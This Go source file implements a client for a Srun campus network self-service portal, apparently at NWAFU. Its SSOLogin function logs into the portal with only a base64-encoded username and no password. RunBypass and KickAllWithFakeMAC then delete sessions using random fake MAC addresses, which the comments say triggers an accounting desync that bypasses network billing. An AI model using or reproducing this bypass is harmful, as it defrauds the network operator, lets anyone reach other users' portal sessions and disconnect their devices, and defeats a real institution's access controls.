package srun

import (
	"crypto/rand"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
)

// SelfServiceClient handles communication with the Srun self-service portal.
type SelfServiceClient struct {
	BaseURL string
	log     Logger

	httpClient *http.Client
}

// NewSelfServiceClient creates a new self-service client.
func NewSelfServiceClient() *SelfServiceClient {
	jar, err := cookiejar.New(nil)
	if err != nil {
		jar = nil
	}
	return &SelfServiceClient{
		BaseURL:    SelfServiceDomain,
		log:        NopLogger{},
		httpClient: newSelfServiceHTTPClient(jar),
	}
}

// SetLogger sets the diagnostic logger.
func (s *SelfServiceClient) SetLogger(l Logger) {
	if l == nil {
		s.log = NopLogger{}
		return
	}
	s.log = l
}

// SetVerbose enables verbose logging to stderr.
func (s *SelfServiceClient) SetVerbose(verbose bool) {
	s.log = NewVerboseLogger(verbose, "SelfService")
}

func (s *SelfServiceClient) probeAndSetBaseURL() {
	if s.BaseURL != "" && s.BaseURL != SelfServiceDomain {
		return
	}
	s.BaseURL = resolveBaseURL(SelfServiceDomain, SelfServiceFallback, "/site/sso", "http")
}

// SSOLogin performs SSO login to the self-service portal.
func (s *SelfServiceClient) SSOLogin(username string) error {
	s.probeAndSetBaseURL()

	token := base64.StdEncoding.EncodeToString([]byte("zh-CN:" + username))
	ssoURL := s.BaseURL + "/site/sso?data=" + token

	s.log.Debugf("SSO URL: %s", ssoURL)

	req, err := http.NewRequest(http.MethodGet, ssoURL, nil)
	if err != nil {
		return fmt.Errorf("SSO request failed: %w", err)
	}
	req.Header.Set("User-Agent", DefaultUserAgent)

	resp, err := s.httpClient.Do(req)
	if err != nil {
		return wrapSelfServiceErr(err, "SSO")
	}
	defer resp.Body.Close()

	if resp.StatusCode >= http.StatusBadRequest {
		return fmt.Errorf("%w: HTTP %d", ErrSSORedirectedToLogin, resp.StatusCode)
	}

	if resp.Request != nil && strings.Contains(resp.Request.URL.Path, "/login") {
		return fmt.Errorf("%w: redirected to %s", ErrSSORedirectedToLogin, resp.Request.URL.Path)
	}

	s.log.Debugf("SSO login successful for user %s", username)
	return nil
}

// SessionInfo holds parsed session data from the self-service home page.
type SessionInfo struct {
	ID  string
	MAC string
}

// CSRFInfo holds parsed CSRF field name and token from home page HTML.
type CSRFInfo struct {
	FieldName string
	Token     string
}

var (
	// Yii2 standard: <meta name="csrf-param" content="_csrf-8800"> + csrf-token
	csrfTokenMetaRe  = regexp.MustCompile(`(?i)<meta[^>]*\bname\s*=\s*["']csrf-token["'][^>]*\bcontent\s*=\s*["']([^"']+)["']`)
	csrfTokenMetaRe2 = regexp.MustCompile(`(?i)<meta[^>]*\bcontent\s*=\s*["']([^"']+)["'][^>]*\bname\s*=\s*["']csrf-token["']`)
	csrfParamMetaRe  = regexp.MustCompile(`(?i)<meta[^>]*\bname\s*=\s*["']csrf-param["'][^>]*\bcontent\s*=\s*["']([^"']+)["']`)
	csrfParamMetaRe2 = regexp.MustCompile(`(?i)<meta[^>]*\bcontent\s*=\s*["']([^"']+)["'][^>]*\bname\s*=\s*["']csrf-param["']`)
	csrfHiddenRe     = regexp.MustCompile(`(?i)\bname\s*=\s*["'](_csrf-[^"']+)["'][^>]*\bvalue\s*=\s*["']([^"']+)["']`)
	csrfHiddenRe2    = regexp.MustCompile(`(?i)\bvalue\s*=\s*["']([^"']+)["'][^>]*\bname\s*=\s*["'](_csrf-[^"']+)["']`)
	csrfNameOnlyRe   = regexp.MustCompile(`(?i)\bname\s*=\s*["'](_csrf-[^"']+)["']`)
	deleteLinkRe     = regexp.MustCompile(`/home/delete\?id=(\d+)&(?:amp;)?user_mac=([^"&]+)`)
)

func parseCSRF(html string) (*CSRFInfo, error) {
	token := firstSubmatch(html, csrfTokenMetaRe, csrfTokenMetaRe2)
	if token == "" {
		return nil, fmt.Errorf("%w: meta csrf-token missing", ErrCSRFParseFailed)
	}

	csrf := &CSRFInfo{Token: token}

	// Yii2: field name in csrf-param meta (common on NWAFU self-service).
	if param := firstSubmatch(html, csrfParamMetaRe, csrfParamMetaRe2); param != "" {
		csrf.FieldName = param
		return csrf, nil
	}

	if m := csrfHiddenRe.FindStringSubmatch(html); len(m) >= 3 {
		csrf.FieldName = m[1]
		if m[2] != "" {
			csrf.Token = m[2]
		}
		return csrf, nil
	}
	if m := csrfHiddenRe2.FindStringSubmatch(html); len(m) >= 3 {
		csrf.FieldName = m[2]
		if m[1] != "" {
			csrf.Token = m[1]
		}
		return csrf, nil
	}
	if m := csrfNameOnlyRe.FindStringSubmatch(html); len(m) >= 2 {
		csrf.FieldName = m[1]
		return csrf, nil
	}

	return nil, fmt.Errorf("%w: csrf-param meta and _csrf field not found", ErrCSRFParseFailed)
}

func firstSubmatch(html string, res ...*regexp.Regexp) string {
	for _, re := range res {
		if m := re.FindStringSubmatch(html); len(m) >= 2 {
			return m[1]
		}
	}
	return ""
}

// ParseHomePage extracts CSRF info and online sessions from self-service HTML.
func ParseHomePage(html string) (*CSRFInfo, []SessionInfo, error) {
	csrf, err := parseCSRF(html)
	if err != nil {
		return nil, nil, err
	}

	matches := deleteLinkRe.FindAllStringSubmatch(html, -1)
	var sessions []SessionInfo
	for _, m := range matches {
		mac, _ := url.QueryUnescape(m[2])
		sessions = append(sessions, SessionInfo{ID: m[1], MAC: mac})
	}
	return csrf, sessions, nil
}

// GetSessions fetches the home page and parses CSRF token + session list.
func (s *SelfServiceClient) GetSessions() (*CSRFInfo, []SessionInfo, error) {
	req, err := http.NewRequest(http.MethodGet, s.BaseURL+"/home", nil)
	if err != nil {
		return nil, nil, err
	}
	req.Header.Set("User-Agent", DefaultUserAgent)

	resp, err := s.httpClient.Do(req)
	if err != nil {
		return nil, nil, wrapSelfServiceErr(err, "fetch home page")
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to read home page: %w", err)
	}

	csrf, sessions, err := ParseHomePage(string(body))
	if err != nil {
		return nil, nil, fmt.Errorf("%w", err)
	}

	s.log.Debugf("found %d sessions", len(sessions))
	return csrf, sessions, nil
}

// KickSession sends POST /home/delete to kick a single session.
//
// Network-layer errors (timeout, connection reset) are retried up to
// KickRetry times because TUN-mode VPN / fake-IP proxies frequently drop the
// first request before letting subsequent ones through. HTTP-status errors
// are NOT retried to avoid double-kicks.
func (s *SelfServiceClient) KickSession(id, mac string, csrf *CSRFInfo) error {
	if csrf == nil || csrf.FieldName == "" {
		return errors.New("CSRF info required")
	}

	deleteURL := fmt.Sprintf("%s/home/delete?id=%s&user_mac=%s", s.BaseURL, id, url.QueryEscape(mac))

	formData := url.Values{}
	formData.Set(csrf.FieldName, csrf.Token)
	formData.Set("id", id)
	formData.Set("user_mac", mac)
	body := formData.Encode()

	var lastErr error
	for attempt := 0; attempt <= KickRetry; attempt++ {
		req, err := http.NewRequest(http.MethodPost, deleteURL, strings.NewReader(body))
		if err != nil {
			return err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", DefaultUserAgent)
		req.Header.Set("Referer", s.BaseURL+"/home")

		resp, err := s.httpClient.Do(req)
		if err != nil {
			lastErr = fmt.Errorf("kick request failed: %w", err)
			if attempt < KickRetry {
				s.log.Debugf("kick %s attempt %d failed: %v; retrying", id, attempt+1, err)
				sleep(KickRetryGap)
				continue
			}
			return lastErr
		}
		body, readErr := io.ReadAll(resp.Body)
		resp.Body.Close()
		if readErr != nil {
			lastErr = fmt.Errorf("kick response read failed: %w", readErr)
			if attempt < KickRetry {
				sleep(KickRetryGap)
				continue
			}
			return lastErr
		}

		if resp.StatusCode != http.StatusOK {
			return fmt.Errorf("%w: HTTP %d", ErrKickFailed, resp.StatusCode)
		}
		if kickResponseIndicatesError(string(body)) {
			return fmt.Errorf("%w: server rejected kick", ErrKickFailed)
		}
		s.log.Debugf("kicked session %s", id)
		return nil
	}
	return lastErr
}

func randomMAC() (string, error) {
	b := make([]byte, 6)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	b[0] = (b[0] | 0x02) & 0xFE
	return fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x", b[0], b[1], b[2], b[3], b[4], b[5]), nil
}

// KickAllWithFakeMAC kicks sessions using random fake MACs.
// If myMAC is non-empty, only sessions matching that MAC are kicked.
//
// Each session is kicked with its own freshly generated random MAC. This
// matches the bypass behavior that has been observed to actually trigger the
// Srun accounting desync at NWAFU, so do not "optimize" this into one shared
// MAC for the whole batch.
func (s *SelfServiceClient) KickAllWithFakeMAC(myMAC string) (int, error) {
	csrf, sessions, err := s.GetSessions()
	if err != nil {
		return 0, err
	}

	filterMAC := normalizeMAC(myMAC)
	targets := 0
	kicked := 0
	for _, sess := range sessions {
		if filterMAC != "" && normalizeMAC(sess.MAC) != filterMAC {
			continue
		}
		targets++
		fake, err := randomMAC()
		if err != nil {
			return kicked, err
		}
		if err := s.KickSession(sess.ID, fake, csrf); err != nil {
			s.log.Debugf("failed to kick session %s: %v", sess.ID, err)
			continue
		}
		kicked++
	}
	if kicked == 0 {
		if len(sessions) == 0 {
			return 0, ErrNoSessionsToKick
		}
		if filterMAC != "" {
			return 0, fmt.Errorf("%w: filter MAC %s", ErrNoMatchingSession, myMAC)
		}
		if targets > 0 {
			return 0, fmt.Errorf("%w: all kick requests failed", ErrKickFailed)
		}
	}
	if kicked < targets {
		s.log.Warnf("kicked %d/%d sessions", kicked, targets)
	}
	return kicked, nil
}

// KickAllByMAC kicks sessions using their real MAC (for actual logout).
// myMAC must be non-empty; use KickAllWithFakeMAC with macFilter "" to kick all.
func (s *SelfServiceClient) KickAllByMAC(myMAC string) (int, error) {
	if myMAC == "" {
		return 0, fmt.Errorf("%w: KickAllByMAC requires device MAC", ErrMACUndetected)
	}
	csrf, sessions, err := s.GetSessions()
	if err != nil {
		return 0, err
	}

	filter := normalizeMAC(myMAC)
	kicked := 0
	for _, sess := range sessions {
		if normalizeMAC(sess.MAC) != filter {
			continue
		}
		if err := s.KickSession(sess.ID, sess.MAC, csrf); err != nil {
			s.log.Debugf("failed to kick session %s: %v", sess.ID, err)
			continue
		}
		kicked++
	}
	return kicked, nil
}

// RunBypass executes SSO + fake-MAC kick + optional session check.
//
// macFilter == "" kicks every session under the account (required for the
// RADIUS accounting desync to actually take effect, but also clears any
// other devices on the same account). A non-empty macFilter only kicks
// sessions matching that MAC.
func RunBypass(username string, macFilter string, verbose bool, checkAfter bool) (int, []SessionInfo, error) {
	ss := NewSelfServiceClient()
	ss.SetVerbose(verbose)

	if err := ss.SSOLogin(username); err != nil {
		return 0, nil, fmt.Errorf("bypass SSO: %w", err)
	}

	kicked, err := ss.KickAllWithFakeMAC(macFilter)
	if err != nil {
		return 0, nil, fmt.Errorf("bypass kick: %w", err)
	}

	if !checkAfter {
		return kicked, nil, nil
	}

	sleep(BypassCheckDelay)
	if err := ss.SSOLogin(username); err != nil {
		ss.log.Warnf("post-kick session check skipped (SSO): %v", err)
		return kicked, nil, nil
	}
	_, sessions, err := ss.GetSessions()
	if err != nil {
		ss.log.Warnf("post-kick session check skipped: %v", err)
		return kicked, nil, nil
	}
	return kicked, sessions, nil
}

func kickResponseIndicatesError(body string) bool {
	b := strings.ToLower(body)
	return strings.Contains(b, "alert-danger") || strings.Contains(b, "error-summary")
}
